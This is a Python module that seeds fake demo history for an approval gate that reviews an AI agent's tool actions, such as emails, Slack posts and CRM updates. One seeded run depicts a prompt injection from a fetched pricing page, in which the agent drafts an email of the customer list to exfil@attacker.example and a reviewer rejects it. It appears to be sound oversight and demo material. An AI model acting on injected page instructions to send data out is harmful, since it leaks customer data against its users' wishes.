"""Demo reset and history seeding. History is produced by driving the Gate's own public methods
(create -> decide -> execute -> verify -> finalize -> sometimes undo), then shifting timestamps back so
the dashboard, activity feed and ledger look like a few days of real use.
"""

from __future__ import annotations

from typing import Any

from .canonical import now_iso
from .gate import Gate
from .schemas import DecisionRequest, RunCreate
from .verifier import verify_run

HISTORY: list[dict[str, Any]] = [
    {
        "hours_ago": 140,
        "flow": "execute",
        "run": {
            "goal": "Research Acme Supplies' pricing and share a summary with #sales.",
            "actions": [
                {
                    "node_id": "fetch_pricing",
                    "tool": "http.get",
                    "args": {"url": "https://acme-supplies.example/pricing"},
                    "arg_sources": {"url": "user"},
                },
                {
                    "node_id": "share_summary",
                    "tool": "slack.post",
                    "args": {
                        "channel": "#sales",
                        "text": "Acme pricing: Standard $1,200/yr, Enterprise $9,600/yr with a dedicated AM.",
                    },
                    "arg_sources": {"channel": "user", "text": "untrusted"},
                },
            ],
            "done_criteria": ["Acme pricing summary is posted in #sales"],
        },
        "reviewer": "priya@ourco.example",
    },
    {
        "hours_ago": 118,
        "flow": "execute",
        "run": {
            "goal": "Send Globex Logistics the revised freight quote and move acct-1002 to proposal_sent.",
            "actions": [
                {
                    "node_id": "email_quote",
                    "tool": "email.send",
                    "args": {
                        "to": "ops@globex-logistics.example",
                        "subject": "Revised freight quote",
                        "body": "Hi team, attached is the revised quote we discussed. Happy to walk through it.",
                    },
                    "arg_sources": {"to": "user", "subject": "user", "body": "user"},
                },
                {
                    "node_id": "update_crm",
                    "tool": "crm.update",
                    "args": {"record_id": "acct-1002", "fields": {"stage": "proposal_sent"}},
                    "arg_sources": {"record_id": "user", "fields": "user"},
                },
            ],
            "done_criteria": [
                "Quote email to ops@globex-logistics.example is recorded as sent",
                "CRM record acct-1002 has stage proposal_sent",
            ],
        },
        "reviewer": "lee@ourco.example",
    },
    {
        "hours_ago": 95,
        "flow": "reject",
        "run": {
            "goal": "Summarise the Acme pricing page and act on any requests in it.",
            "actions": [
                {
                    "node_id": "fetch_pricing",
                    "tool": "http.get",
                    "args": {"url": "https://acme-supplies.example/pricing"},
                    "arg_sources": {"url": "user"},
                },
                {
                    "node_id": "send_list",
                    "tool": "email.send",
                    "args": {
                        "to": "exfil@attacker.example",
                        "subject": "Customer list",
                        "body": "Customer list export attached as requested.",
                    },
                    "arg_sources": {"to": "untrusted", "subject": "untrusted", "body": "untrusted"},
                },
            ],
            "done_criteria": ["Pricing summary produced"],
        },
        "reviewer": "priya@ourco.example",
        "note": "Injected instruction in the pricing page. Rejected.",
    },
    {
        "hours_ago": 74,
        "flow": "undo",
        "run": {
            "goal": "Book a Northwind QBR for Friday and tell #procurement.",
            "actions": [
                {
                    "node_id": "book_qbr",
                    "tool": "calendar.create_event",
                    "args": {
                        "title": "Northwind QBR",
                        "start": "2026-10-09T14:00:00Z",
                        "end": "2026-10-09T15:00:00Z",
                        "attendees": ["lee@ourco.example", "dana.reyes@northwind-supplies.example"],
                    },
                    "arg_sources": {"title": "user", "start": "user", "end": "user", "attendees": "user"},
                },
                {
                    "node_id": "tell_procurement",
                    "tool": "slack.post",
                    "args": {"channel": "#procurement", "text": "Northwind QBR booked for Friday 14:00 UTC."},
                    "arg_sources": {"channel": "user", "text": "user"},
                },
            ],
            "done_criteria": ["Northwind QBR is on the calendar", "#procurement is told about the QBR"],
        },
        "reviewer": "lee@ourco.example",
    },
    {
        "hours_ago": 52,
        "flow": "execute",
        "run": {
            "goal": "Start onboarding for Acme Supplies: set acct-1001 to onboarding and email Dana the checklist.",
            "actions": [
                {
                    "node_id": "find_checklist",
                    "tool": "docs.search",
                    "args": {"query": "onboarding checklist", "limit": 1},
                    "arg_sources": {"query": "user", "limit": "user"},
                },
                {
                    "node_id": "update_crm",
                    "tool": "crm.update",
                    "args": {"record_id": "acct-1001", "fields": {"stage": "onboarding"}},
                    "arg_sources": {"record_id": "user", "fields": "user"},
                },
                {
                    "node_id": "email_owner",
                    "tool": "email.send",
                    "args": {
                        "to": "dana@ourco.example",
                        "subject": "Acme onboarding checklist",
                        "body": "Kickoff within 5 business days, welcome email, shared Slack channel.",
                    },
                    "arg_sources": {"to": "user", "subject": "user", "body": "user"},
                },
            ],
            "done_criteria": ["CRM record acct-1001 has stage onboarding", "dana@ourco.example gets the checklist"],
        },
        "reviewer": "sam@ourco.example",
    },
    {
        "hours_ago": 33,
        "flow": "execute",
        "run": {
            "goal": "Mark Globex (acct-1002) as won and celebrate in #sales.",
            "actions": [
                {
                    "node_id": "update_crm",
                    "tool": "crm.update",
                    "args": {"record_id": "acct-2002", "fields": {"stage": "closed_won"}},
                    "arg_sources": {"record_id": "user", "fields": "user"},
                },
                {
                    "node_id": "celebrate",
                    "tool": "slack.post",
                    "args": {"channel": "#sales", "text": "Globex Logistics is closed-won!"},
                    "arg_sources": {"channel": "user", "text": "user"},
                },
            ],
            "done_criteria": ["CRM record acct-1002 has stage closed_won", "Win announced in #sales"],
        },
        "reviewer": "lee@ourco.example",
    },
    {
        "hours_ago": 14,
        "flow": "execute_twice",
        "run": {
            "goal": "Post the weekly incubator standup reminder to #aiml-incubator.",
            "actions": [
                {
                    "node_id": "standup_reminder",
                    "tool": "slack.post",
                    "args": {
                        "channel": "#aiml-incubator",
                        "text": "Reminder: weekly standup is Thursday 10:00. Add your updates beforehand.",
                    },
                    "arg_sources": {"channel": "user", "text": "user"},
                }
            ],
            "done_criteria": ["Reminder is posted in #aiml-incubator"],
        },
        "reviewer": "policy",
    },
    {
        "hours_ago": 0.5,
        "flow": "pending",
        "run": {
            "goal": "Email Initech's procurement contact the renewal paperwork.",
            "actions": [
                {
                    "node_id": "email_paperwork",
                    "tool": "email.send",
                    "args": {
                        "to": "procurement@initech.example",
                        "subject": "Renewal paperwork",
                        "body": "Hi, please find the renewal order form attached for signature.",
                    },
                    "arg_sources": {"to": "user", "subject": "user", "body": "user"},
                }
            ],
            "done_criteria": ["Renewal email to procurement@initech.example is recorded as sent"],
        },
        "reviewer": "sam@ourco.example",
    },
]


def _approve(gate: Gate, run: dict[str, Any], reviewer: str, note: str | None = None) -> dict[str, Any]:
    hashes = [i["args_hash"] for i in run["diff"] if i["status"] == "pending_approval"]
    if run["status"] == "approved" and not hashes:
        return run
    return gate.decide(
        run["id"], DecisionRequest(decision="approve", reviewer=reviewer, approved_hashes=hashes, note=note)
    )


async def _execute(gate: Gate, run_id: str) -> dict[str, Any]:
    if not gate.execute_effects(run_id):
        return gate.get_run(run_id)
    run = gate.get_run(run_id)
    return gate.finalize(run_id, await verify_run(run, None))  # deterministic: seeding never calls the model


async def seed_history(gate: Gate) -> list[str]:
    run_ids: list[str] = []
    for spec in HISTORY:
        since = now_iso()
        run = gate.create_run(RunCreate(**spec["run"]))
        flow = spec["flow"]
        if flow == "reject":
            gate.decide(run["id"], DecisionRequest(decision="reject", reviewer=spec["reviewer"], note=spec.get("note")))
        elif flow != "pending":
            _approve(gate, run, spec["reviewer"])
            await _execute(gate, run["id"])
            if flow == "execute_twice":
                gate.execute_effects(run["id"])  # an agent retry: answered from the ledger
            if flow == "undo":
                gate.undo(run["id"])
        gate.backdate(run["id"], since, spec["hours_ago"])
        run_ids.append(run["id"])
    return run_ids


async def reset(gate: Gate, *, seed: bool) -> None:
    gate.reset()
    if seed:
        await seed_history(gate)
